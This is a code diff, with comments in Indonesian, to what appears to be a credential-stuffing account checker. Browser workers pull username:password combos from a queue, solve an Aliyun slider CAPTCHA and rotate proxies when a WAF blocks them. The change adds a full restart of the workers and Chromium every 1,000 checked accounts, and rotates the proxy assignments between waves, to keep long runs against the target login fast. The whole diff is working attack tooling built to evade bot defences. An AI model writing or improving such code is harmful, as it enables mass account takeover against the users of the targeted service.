@@ -14,6 +14,7 @@ import argparse
 import base64
 import datetime
 from collections import deque
+import gc
 import hashlib
 import json
 import math
@@ -417,6 +418,8 @@ def render_dashboard(force: bool = False):
     st = stats['status']
     if st == 'WAF_WAIT':
         badge = "\033[41;97m ! WAF / ROTATE \033[0m" if _COLOR_OK else "[! WAF]"
+    elif st == 'REFRESH':
+        badge = "\033[46;30m ~ REFRESH 1K \033[0m" if _COLOR_OK else "[~ REFRESH]"
     elif st == 'DONE':
         badge = "\033[42;30m + FINISHED \033[0m" if _COLOR_OK else "[+ DONE]"
     else:
@@ -1730,12 +1733,17 @@ async def _route_filter(route):
         pass
 
 # ── Worker Task Loop with Proxy & WAF Isolation ─────────────────────────────
+WAVE_REFRESH_EVERY = 1000
+
 async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                      browser, dm, base_proxy_info=None, proxy_pool=None,
-                     ensure_browser=None, browser_state=None, acct_retries=None):
+                     ensure_browser=None, browser_state=None, acct_retries=None,
+                     wave_limit: int = 0):
     """
     Worker 1/2-tab per browser context dengan Direct Vue Bridge + Aliyun slider solver.
     """
+    if wave_limit and stats['checked'] >= wave_limit:
+        return
     ctx              = None
     page             = None
     page2            = None
@@ -2067,6 +2075,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
         p2_miss = 0
         try:
           while True:
+            if wave_limit and stats['checked'] >= wave_limit:
+                break
             try:
                 u, pw = combo_q.get_nowait()
             except asyncio.QueueEmpty:
@@ -2149,7 +2159,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         combo_q.task_done()
                         done_item = True
                         print_progress()
-                        if ctx_accts >= ACCOUNTS_PER_CTX or (browser_state is not None and browser_state['recycling']):
+                        if (not wave_limit or stats['checked'] < wave_limit) and (ctx_accts >= ACCOUNTS_PER_CTX or (browser_state is not None and browser_state['recycling'])):
                             await _recover_ctx(my_gen, 'periodic_rotate')
                         break
 
@@ -2177,6 +2187,12 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         combo_q.task_done()
                         done_item = True
                         print_progress()
+                        break
+
+                    if wave_limit and stats['checked'] >= wave_limit:
+                        combo_q.put_nowait((u, pw))
+                        combo_q.task_done()
+                        done_item = True
                         break
 
                     if kind == 'WAF':
@@ -2520,23 +2536,22 @@ async def async_main():
             combo_q.put_nowait(item)
 
 
-        # Worker wrapper: auto-restart jika worker crash sebelum queue habis.
-        # Tanpa ini, satu crash = satu worker mati permanen dan throughput turun.
-        async def worker_with_restart(wid: int, p_info):
+        # Worker wrapper: auto-restart jika worker crash sebelum queue habis / batas wave 1k.
+        async def worker_with_restart(wid: int, p_info, wave_limit: int = 0):
             MAX_CONSECUTIVE_FAILS = 10
             fail_count = 0
             acct_retries = {}
-            while not combo_q.empty():
+            while not combo_q.empty() and not (wave_limit and stats['checked'] >= wave_limit):
                 started_at = time.time()
                 try:
                     cur_b = await ensure_browser(force_relaunch=(fail_count >= 6 and browser_state['active'] == 0))
                     await run_worker(
                         wid, queue, combo_q, cur_b, dm, p_info, live_pool,
                         ensure_browser=ensure_browser, browser_state=browser_state,
-                        acct_retries=acct_retries,
+                        acct_retries=acct_retries, wave_limit=wave_limit,
                     )
-                    if combo_q.empty():
-                        break  # selesai normal
+                    if combo_q.empty() or (wave_limit and stats['checked'] >= wave_limit):
+                        break  # selesai wave / queue habis
                     fail_count += 1
                 except asyncio.CancelledError:
                     raise  # propagate Ctrl+C
@@ -2551,6 +2566,8 @@ async def async_main():
                         else:
                             print_result('ERR', f"worker-{wid}", "sys", f"stopped:{str(e)[:15]}")
                         break
+                    if wave_limit and stats['checked'] >= wave_limit:
+                        break
                     wait = min(2 ** min(fail_count, 4), 16)  # exponential backoff max 16s
                     if not _TUI_ACTIVE:
                         p_out(f"{c(GOLD)}[!] w{wid} crash #{fail_count}, restart dalam {wait}s...{W}")
@@ -2558,13 +2575,42 @@ async def async_main():
                         print_result('ERR', f"worker-{wid}", "sys", f"restart #{fail_count}")
                     await asyncio.sleep(wait)
 
-        num_workers = min(NUM_CONTEXTS, len(queue))
-        for i in range(num_workers):
-            p_info = proxy_assignments[i] if PROXY_ENABLED else None
-            tasks.append(asyncio.create_task(worker_with_restart(i, p_info)))
-
         try:
-            await asyncio.gather(*tasks)
+            wave_idx = 0
+            while not combo_q.empty():
+                wave_limit = stats['checked'] + WAVE_REFRESH_EVERY
+                num_workers = min(NUM_CONTEXTS, combo_q.qsize())
+                stats['workers'] = num_workers
+                stats['workers_total'] = num_workers
+                stats['status'] = 'RUNNING'
+                render_dashboard(force=True)
+
+                tasks = []
+                for i in range(num_workers):
+                    p_info = proxy_assignments[(i + wave_idx) % NUM_CONTEXTS] if PROXY_ENABLED else None
+                    tasks.append(asyncio.create_task(worker_with_restart(i, p_info, wave_limit=wave_limit)))
+
+                await asyncio.gather(*tasks)
+
+                if combo_q.empty() or stats['checked'] < wave_limit:
+                    break
+
+                # ponytail: full clean wave restart every 1k accounts prevents long-run Chromium slowdown
+                wave_idx += 1
+                stats['status'] = 'REFRESH'
+                if _TUI_ACTIVE:
+                    render_dashboard(force=True)
+                else:
+                    p_out(f"\n{c(CYAN)}[*] Refresh penuh wave #{wave_idx} ({stats['checked']:,} akun): restart semua worker & Chromium...{W}")
+                _STATIC_CACHE.clear()
+                _TUNNEL_BLACKLIST.clear()
+                gc.collect()
+                await ensure_browser(force_relaunch=True, stale_browser=browser_ref[0])
+                browser_state['born_ctx'] = stats['proxy_ctx']
+                browser_state['active'] = 0
+                browser_state['recycling'] = False
+                browser_state['gate'].set()
+                browser_state['zero_evt'].set()
         except (KeyboardInterrupt, asyncio.CancelledError):
             p_out(f"\n{Y}[*] Menghentikan worker...{W}")
             for t in tasks:
